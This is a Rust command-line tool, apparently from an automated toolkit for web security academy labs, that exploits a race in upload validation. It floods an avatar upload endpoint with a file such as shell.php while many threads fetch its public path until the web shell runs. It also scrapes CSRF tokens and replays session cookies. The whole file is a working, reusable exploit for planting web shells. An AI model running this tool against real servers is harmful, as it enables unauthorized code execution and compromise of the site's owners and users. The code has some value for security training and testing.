#!/usr/bin/env rust-script
//! name: upload_race
//! description: 上传-取回窗口竞态件 - 对同一上传端点持续多线程投递文件(服务端写盘后才校验并删除,窗口内文件可读),同时以更高并发猛取回该文件的公开路径,任一取回命中即停;一个信封给出上传/取回计数、两侧状态直方图、命中状态/字节/片段/密文候选与耗时。专治"写后删"型上传校验竞态(web shell upload via race condition)。
//! version: 1.0.1
//! args: <base-url> --file LOCAL [--filename shell.php] [--path /my-account/avatar] [--fetch-path /files/avatars/shell.php] [--field k=v]... [--jar JAR] [--csrf TOK] [--account-path /my-account] [--uploaders N] [--getters N] [--seconds N] [--pad N] [--marker S] [--snippet N] [--selftest]
//! keywords: file-upload, race-condition, toctou, web-shell, concurrent, parallel, hunter, 竞态
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```
use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::BTreeMap;
use std::io::Read;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

const BOUNDARY: &str = "----piUploadRace7Q2X";

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut base = String::new();
    let mut file = String::new();
    let mut filename = "shell.php".to_string();
    let mut path = "/my-account/avatar".to_string();
    let mut fetch_path = String::new();
    let mut account_path = "/my-account".to_string();
    let mut fields: Vec<(String, String)> = Vec::new();
    let mut jar_path = String::new();
    let mut csrf = String::new();
    let mut uploaders = 6usize;
    let mut getters = 16usize;
    let mut seconds = 20u64;
    let mut pad = 0usize;
    let mut marker = String::new();
    let mut snippet_len = 200usize;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--file" => { i += 1; file = arg(&args, i); }
            "--filename" => { i += 1; filename = arg(&args, i); }
            "--path" => { i += 1; path = arg(&args, i); }
            "--fetch-path" => { i += 1; fetch_path = arg(&args, i); }
            "--account-path" => { i += 1; account_path = arg(&args, i); }
            "--field" => {
                i += 1;
                let kv = arg(&args, i);
                if let Some((k, v)) = kv.split_once('=') {
                    fields.push((k.to_string(), v.to_string()));
                }
            }
            "--jar" => { i += 1; jar_path = arg(&args, i); }
            "--csrf" => { i += 1; csrf = arg(&args, i); }
            "--uploaders" => { i += 1; uploaders = arg(&args, i).parse().unwrap_or(6).max(1); }
            "--getters" => { i += 1; getters = arg(&args, i).parse().unwrap_or(16).max(1); }
            "--seconds" => { i += 1; seconds = arg(&args, i).parse().unwrap_or(20).max(1); }
            "--pad" => { i += 1; pad = arg(&args, i).parse().unwrap_or(0); }
            "--marker" => { i += 1; marker = arg(&args, i); }
            "--snippet" => { i += 1; snippet_len = arg(&args, i).parse().unwrap_or(200); }
            other if !other.starts_with("--") && base.is_empty() => base = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    let base = base.trim_end_matches('/').to_string();
    if base.is_empty() || file.is_empty() {
        pi_rust_lib::report::failure(
            "upload_race",
            "missing <base-url> or --file",
            "usage: upload_race <base-url> --file /tmp/shell.php [--filename shell.php] [--jar JAR] [--field user=user1]",
        );
        std::process::exit(2);
    }
    if fetch_path.is_empty() {
        fetch_path = format!("/files/avatars/{filename}");
    }
    let mut payload = match std::fs::read(&file) {
        Ok(b) => b,
        Err(e) => {
            pi_rust_lib::report::failure("upload_race", &format!("cannot read {file}: {e}"), "pass a readable local file");
            std::process::exit(2);
        }
    };
    if pad > 0 {
        payload.extend_from_slice(b" //");
        payload.extend(std::iter::repeat(b'A').take(pad));
    }
    let cookie = if jar_path.is_empty() { String::new() } else { cookie_header(&load_jar(&jar_path), &base) };
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(25)).redirects(0).build();

    if csrf.is_empty() {
        let html = http_get(&agent, &format!("{base}{account_path}"), &cookie).1;
        csrf = extract_csrf(&html).unwrap_or_default();
    }
    if csrf.is_empty() {
        pi_rust_lib::report::failure(
            "upload_race",
            "no csrf token found (pass --csrf or --jar for a logged-in session)",
            "log in first and pass --jar, or copy the avatar form csrf with --csrf",
        );
        std::process::exit(2);
    }

    let body = multipart(&payload, &filename, &fields, &csrf);
    let upload_url = format!("{base}{path}");
    let fetch_url = format!("{base}{fetch_path}");
    let ctype = format!("multipart/form-data; boundary={BOUNDARY}");
    let deadline = Instant::now() + Duration::from_secs(seconds);
    let stop = Arc::new(AtomicBool::new(false));
    let up_ok = Arc::new(AtomicUsize::new(0));
    let get_ok = Arc::new(AtomicUsize::new(0));
    let up_status: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let get_status: Arc<Mutex<BTreeMap<String, usize>>> = Arc::new(Mutex::new(BTreeMap::new()));
    let hit: Arc<Mutex<Option<Value>>> = Arc::new(Mutex::new(None));
    let max_len = Arc::new(AtomicUsize::new(0));
    let non_404: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let started = Instant::now();

    let api = format!("{base}/");
    let mut handles = Vec::new();
    for _ in 0..uploaders {
        let agent = agent.clone();
        let upload_url = upload_url.clone();
        let ctype = ctype.clone();
        let body = body.clone();
        let cookie = cookie.clone();
        let api = api.clone();
        let (stop, up_ok, up_status) = (Arc::clone(&stop), Arc::clone(&up_ok), Arc::clone(&up_status));
        handles.push(std::thread::spawn(move || {
            let _ = agent.get(&api).call();
            while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
                let r = agent.post(&upload_url).set("Content-Type", &ctype).set("Cookie", &cookie).send_bytes(&body);
                let status = match r {
                    Ok(resp) => { let _ = read_body(resp); 200u16 }
                    Err(ureq::Error::Status(code, resp)) => { let _ = read_body(resp); code }
                    Err(_) => 0u16,
                };
                up_ok.fetch_add(1, Ordering::Relaxed);
                *up_status.lock().unwrap().entry(status.to_string()).or_insert(0) += 1;
            }
        }));
    }
    for _ in 0..getters {
        let agent = agent.clone();
        let fetch_url = fetch_url.clone();
        let cookie = cookie.clone();
        let api = api.clone();
        let (stop, get_ok, get_status, hit, max_len, non_404) = (
            Arc::clone(&stop),
            Arc::clone(&get_ok),
            Arc::clone(&get_status),
            Arc::clone(&hit),
            Arc::clone(&max_len),
            Arc::clone(&non_404),
        );
        let marker = marker.clone();
        let up_ok = Arc::clone(&up_ok);
        let started = started;
        handles.push(std::thread::spawn(move || {
            let _ = agent.get(&api).call();
            while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
                let (status, text) = http_get(&agent, &fetch_url, &cookie);
                get_ok.fetch_add(1, Ordering::Relaxed);
                *get_status.lock().unwrap().entry(status.to_string()).or_insert(0) += 1;
                if text.len() > max_len.load(Ordering::Relaxed) {
                    max_len.store(text.len(), Ordering::Relaxed);
                }
                let clean = !text.contains("<title>Not Found</title>") && !text.contains("Not Found");
                let want = if marker.is_empty() { status == 200 && !text.trim().is_empty() } else { text.contains(&marker) };
                if status != 404 && clean && !text.trim().is_empty() {
                    let rec = json!({
                        "status": status,
                        "len": text.len(),
                        "snippet": text.chars().take(snippet_len).collect::<String>(),
                        "secret_candidate": secret_candidate(&text),
                        "uploads_at_hit": up_ok.load(Ordering::Relaxed),
                        "elapsed_secs": started.elapsed().as_secs_f64(),
                    });
                    non_404.lock().unwrap().push(rec.clone());
                    if want {
                        let mut h = hit.lock().unwrap();
                        if h.is_none() {
                            *h = Some(rec);
                        }
                        stop.store(true, Ordering::Relaxed);
                    }
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hit_v = hit.lock().unwrap().clone();
    let non_404_v: Vec<Value> = non_404.lock().unwrap().iter().take(5).cloned().collect();
    let up_status = up_status.lock().unwrap().clone();
    let get_status = get_status.lock().unwrap().clone();
    let uploads = up_ok.load(Ordering::Relaxed);
    let gets = get_ok.load(Ordering::Relaxed);
    let payload_out = json!({
        "base": base,
        "upload_url": upload_url,
        "fetch_url": fetch_url,
        "filename": filename,
        "uploaders": uploaders,
        "getters": getters,
        "uploads": uploads,
        "gets": gets,
        "elapsed_secs": started.elapsed().as_secs_f64(),
        "upload_status_counts": up_status,
        "get_status_counts": get_status,
        "max_get_body_len": max_len.load(Ordering::Relaxed),
        "hit": hit_v,
        "non_404_samples": non_404_v,
    });
    let hint = if payload_out["hit"].is_null() {
        "no window hit: raise --getters/--seconds, add --pad to widen the write->validate window, or run upload_race again"
    } else {
        "window hit - submit the secret via POST /submitSolution (parameter answer) with the same jar"
    };
    pi_rust_lib::report::success("upload_race", payload_out, hint).expect("report success");
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn read_body(resp: ureq::Response) -> String {
    let mut s = String::new();
    let _ = resp.into_reader().take(1 << 20).read_to_string(&mut s);
    s
}

fn http_get(agent: &ureq::Agent, url: &str, cookie: &str) -> (u16, String) {
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.call() {
        Ok(r) => {
            let s = r.status();
            (s, read_body(r))
        }
        Err(ureq::Error::Status(code, r)) => (code, read_body(r)),
        Err(e) => (0, e.to_string()),
    }
}

/// Last `csrf` hidden-input value on the page (the avatar form's token on /my-account).
fn extract_csrf(html: &str) -> Option<String> {
    let mut found = None;
    let mut idx = 0;
    while let Some(pos) = html[idx..].find("name=\"csrf\"") {
        let start = idx + pos;
        let rest = &html[start..];
        if let Some(vpos) = rest.find("value=\"") {
            let vstart = start + vpos + 7;
            if let Some(end) = html[vstart..].find('"') {
                found = Some(html[vstart..vstart + end].to_string());
                idx = vstart + end;
                continue;
            }
        }
        idx = start + 10;
    }
    found
}

/// First 16+ char alphanumeric run in a body - the academy secret shape.
fn secret_candidate(text: &str) -> Option<String> {
    let mut run = String::new();
    for c in text.chars() {
        if c.is_ascii_alphanumeric() {
            run.push(c);
        } else {
            if run.len() >= 16 {
                return Some(run);
            }
            run.clear();
        }
    }
    if run.len() >= 16 { Some(run) } else { None }
}

fn multipart(payload: &[u8], filename: &str, fields: &[(String, String)], csrf: &str) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    out.extend_from_slice(format!("--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n").as_bytes());
    out.extend_from_slice(payload);
    out.extend_from_slice(b"\r\n");
    for (k, v) in fields {
        out.extend_from_slice(format!("--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n").as_bytes());
    }
    out.extend_from_slice(format!("--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n{csrf}\r\n").as_bytes());
    out.extend_from_slice(format!("--{BOUNDARY}--\r\n").as_bytes());
    out
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default();
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let html = "<form><input required type=\"hidden\" name=\"csrf\" value=\"AAA\"></form><input type=\"hidden\" name=\"csrf\" value=\"Svh3QQ\">";
    let csrf = extract_csrf(html);
    let mp = multipart(b"<?php echo 1;", "shell.php", &[("user".to_string(), "user1".to_string())], "TOK");
    let mp = String::from_utf8_lossy(&mp).to_string();
    let ok = csrf.as_deref() == Some("Svh3QQ")
        && mp.contains("name=\"avatar\"; filename=\"shell.php\"")
        && mp.contains("name=\"user\"\r\n\r\nuser1")
        && mp.contains("name=\"csrf\"\r\n\r\nTOK")
        && mp.ends_with(&format!("--{BOUNDARY}--\r\n"))
        && secret_candidate("garbage x9Fk2LmQ7pR4tV1zB6nD8sW3yH5jK0cE tail").is_some()
        && secret_candidate("short abc").is_none();
    let data = json!({"selftest": if ok {"ok"} else {"fail"}, "csrf": csrf, "multipart_len": mp.len()});
    if ok {
        pi_rust_lib::report::success("upload_race", data, "selftest passed; ready to run").expect("report");
    } else {
        pi_rust_lib::report::failure("upload_race", "selftest failed", "inspect csrf/multipart builders");
        std::process::exit(1);
    }
}
